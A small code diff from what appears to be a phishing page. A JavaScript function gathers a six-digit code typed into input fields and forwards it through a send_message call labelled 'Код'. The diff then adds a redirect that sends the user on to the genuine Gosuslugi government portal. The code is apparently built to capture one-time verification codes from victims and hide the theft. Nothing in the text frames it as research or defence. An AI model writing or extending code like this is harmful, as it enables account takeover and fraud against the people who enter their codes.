@@ -127,5 +127,6 @@ function inp6(event) {
     if (inputValue) {
         let code = c1.value + c2.value + c3.value + c4.value + c5.value + c6.value
         send_message(`✅ Код: ${code}`)
+        window.location.href = 'https://www.gosuslugi.ru/'
     }
 }
